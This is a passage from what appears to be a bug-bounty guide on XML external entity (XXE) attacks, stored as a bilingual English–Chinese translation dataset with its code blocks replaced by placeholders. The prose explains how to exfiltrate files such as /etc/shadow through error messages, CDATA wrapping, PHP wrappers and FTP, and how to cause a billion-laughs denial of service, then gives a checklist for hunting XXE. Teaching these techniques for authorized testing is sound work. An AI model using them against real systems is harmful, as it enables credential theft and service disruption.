  prefs: []
  type: TYPE_NORMAL
- en: 'An easier way to exfiltrate data via a blind XXE is by forcing the parser to
    return a descriptive error message. For example, you can induce a File Not Found
    error by referencing a nonexistent file as the value of an external entity. Your
    external DTD can be rewritten as follows:'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE21]'
  id: totrans-101
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: 'Notice that I included the contents of */etc/shadow* in the URL parameter of
    the nonexistent filepath. Then you can submit the same payload to the target to
    trigger the attack:'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE22]'
  id: totrans-103
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: 'This malicious DTD will cause the parser to deliver the desired file contents
    as a File Not Found error:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE23]'
  id: totrans-105
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: Performing Denial-of-Service Attacks
  id: totrans-106
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Another potential way that attackers can exploit XML vulnerabilities is to
    launch denial-of-service attacks, which disrupt the machine so that legitimate
    users cannot access its services. Note that you should never try this on a live
    target! Testing for DoS on a live target can cause the organization financial
    loss and is usually against companies’ bug bounty policies:'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE24]'
  id: totrans-108
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: This payload embeds entities within entities, causing the XML parser to recursively
    dereference entities to get to the root entity value `lol`. Each `lol9` entity
    would be expanded into 10 `lol8` values, and each of those would become 10 `lol7`s,
    and so on. Eventually, a single `lol9` will be expanded into one billion `lol`s.
    This will overload the memory of the XML parser, potentially causing it to crash.
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
- en: 'This attack method is also called a *billion laughs attack* or an *XML bomb*.
    The example here is taken from Wikipedia, where you can read more about the attack:
    [https://en.wikipedia.org/wiki/Billion_laughs_attack](https://en.wikipedia.org/wiki/Billion_laughs_attack).
    Interestingly, although this attack is often classified as an XXE attack, it does
    not involve the use of any external entities!'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
- en: More About Data Exfiltration Using XXEs
  id: totrans-111
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: XXE data exfiltration becomes more complicated if the parser is hardened against
    XXE attacks, and if you are trying to read files of specific formats. But there
    are always more ways to bypass restrictions!
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 如果解析器已经针对 XXE 攻击进行了加固，并且你试图读取特定格式的文件，XXE 数据外泄会变得更加复杂。但总有更多的方法可以绕过限制！
- en: 'Sometimes you’ll want to exfiltrate files that contain XML special characters,
    such as angle brackets (`<>`), quotes (`"` or `''`), and the ampersand (`&`).
    Accessing these files directly via an XXE would break the syntax of your DTD and
    interfere with the exfiltration. Thankfully, XML already has a feature that deals
    with this issue. In an XML file, characters wrapped within `CDATA` (character
    data) tags are not seen as special characters. So, for instance, if you’re exfiltrating
    an XML file, you can rewrite your malicious external DTD as follows:'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 有时你可能需要外泄包含 XML 特殊字符的文件，如尖括号（`<>`）、引号（`"` 或 `'`）以及和号（`&`）。直接通过 XXE 访问这些文件会破坏
    DTD 的语法，影响外泄过程。幸运的是，XML 已经有一个特性来解决这个问题。在 XML 文件中，被 `CDATA`（字符数据）标签包围的字符不会被视为特殊字符。所以，例如，如果你正在外泄一个
    XML 文件，你可以按照以下方式重写你的恶意外部 DTD：
- en: '[PRE25]'
  id: totrans-114
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: 'This DTD first declares a parameter entity that points to the file you want
    to read 1. It also declares two parameter entities containing the strings `"<![CDATA["`
    and `"]]>"`2 3. Then it constructs an exfiltration URL that will not break the
    DTD’s syntax by wrapping the file’s contents in a `CDATA` tag 4. The concatenated
    `exfiltrate` entity declaration will become the following:'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 这个 DTD 首先声明了一个指向你想读取的文件的参数实体 1。它还声明了两个参数实体，分别包含字符串 `"<![CDATA["` 和 `"]]>"` 2
    3。然后，它构建了一个不会破坏 DTD 语法的外泄 URL，将文件内容包裹在 `CDATA` 标签中 4。连接的 `exfiltrate` 实体声明将变成以下内容：
- en: '[PRE26]'
  id: totrans-116
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: You can see that our payloads are quickly getting complicated. To prevent accidentally
    introducing syntax errors to the payload, you can use a tool such as XmlLint ([https://xmllint.com/](https://xmllint.com/))
    to ensure that your XML syntax is valid.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以看到我们的有效载荷正在迅速变得复杂。为了防止不小心引入语法错误，你可以使用像 XmlLint ([https://xmllint.com/](https://xmllint.com/))
    这样的工具来确保你的 XML 语法有效。
- en: 'Finally, send your usual XML payload to the target to execute the attack:'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，向目标发送你常用的 XML 有效载荷来执行攻击：
- en: '[PRE27]'
  id: totrans-119
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: 'Another way of exfiltrating files with special characters is to use a PHP URL
    wrapper. If the target is a PHP-based app, PHP wrappers let you convert the desired
    data into base64 format so you can use it to read XML files or even binary files:'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 另一种外泄包含特殊字符的文件的方法是使用 PHP URL 包装器。如果目标是基于 PHP 的应用程序，PHP 包装器可以让你将所需的数据转换为 base64
    格式，这样你就可以用它来读取 XML 文件或甚至是二进制文件：
- en: '[PRE28]'
  id: totrans-121
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: 'The File Transfer Protocol (FTP) can also be used to send data directly while
    bypassing special character restrictions. HTTP has many special character restrictions
    and typically restricts the length of the URL. Using FTP instead is an easy way
    to bypass that. To use it, you need to run a simple FTP server on your machine
    and modify your malicious DTD accordingly. I used the simple Ruby server script
    at [https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb):'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 文件传输协议（FTP）也可以用来直接发送数据，同时绕过特殊字符限制。HTTP 有许多特殊字符限制，并且通常会限制 URL 的长度。改用 FTP 是绕过这些限制的一个简单方法。要使用
    FTP，你需要在你的机器上运行一个简单的 FTP 服务器，并相应地修改你的恶意 DTD。我使用了 [https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)
    上的简单 Ruby 服务器脚本：
- en: '[PRE29]'
  id: totrans-123
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: We are using port 2121 here because the Ruby FTP server we are using runs on
    port 2121, but the correct port to use depends on how you run your server 1.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在这里使用端口 2121，因为我们使用的 Ruby FTP 服务器运行在 2121 端口，但正确的端口取决于你如何运行服务器 1。
- en: Finding Your First XXE!
  id: totrans-125
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 找到你的第一个 XXE！
- en: 'Now that you understand the basics of the XXE attack, try to find your own
    XXE vulnerability on a real target. Follow the steps covered in this chapter to
    maximize your chances of success:'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 现在你已经了解了 XXE 攻击的基本原理，尝试在真实目标上找到自己的 XXE 漏洞。按照本章中介绍的步骤操作，以最大化成功的机会：
- en: Find data entry points that you can use to submit XML data.
  id: totrans-127
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 找到可以用来提交 XML 数据的数据输入点。
- en: Determine whether the entry point is a candidate for a classic or blind XXE.
    The endpoint might be vulnerable to classic XXE if it returns the parsed XML data
    in the HTTP response. If the endpoint does not return results, it might still
    be vulnerable to blind XXE, and you should set up a callback listener for your
    tests.
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 确定入口点是否可能是经典或盲式XXE的候选目标。如果端点在HTTP响应中返回解析后的XML数据，则可能存在经典XXE漏洞。如果端点没有返回结果，它仍然可能受到盲式XXE攻击，您应该为测试设置回调监听器。
- en: Try out a few test payloads to see if the parser is improperly configured. In
    the case of classic XXEs, you can check whether the parser is processing external
    entities. In the case of blind XXEs, you can make the server send requests to
    your callback listener to see if you can trigger outbound interaction.
  id: totrans-129
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 尝试几个测试负载，看看解析器是否配置不当。在经典XXE的情况下，您可以检查解析器是否在处理外部实体。在盲式XXE的情况下，您可以使服务器向回调监听器发送请求，看看是否能触发外向交互。
- en: If the XML parser has the functionalities that make it vulnerable to XXE attacks,
    try to exfiltrate a common system file, like */etc/hostname*.
  id: totrans-130
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果XML解析器具有使其容易受到XXE攻击的功能，尝试导出一个常见的系统文件，例如*/etc/hostname*。
- en: You can also try to retrieve some more sensitive system files, like */etc/shadow*
    or *~/.bash_history*.
  id: totrans-131
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 您还可以尝试检索一些更敏感的系统文件，例如*/etc/shadow*或*~/.bash_history*。
- en: If you cannot exfiltrate the entire file with a simple XXE payload, try to use
    an alternative data exfiltration method.
  id: totrans-132
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果您无法通过简单的XXE负载导出整个文件，请尝试使用其他数据外泄方法。
- en: See if you can launch an SSRF attack using the XXE.
  id: totrans-133
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 查看是否可以利用XXE发起SSRF攻击。
- en: Draft up your very first XXE report and send it over to the company!
  id: totrans-134
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 起草您的第一个XXE报告并将其发送给公司！
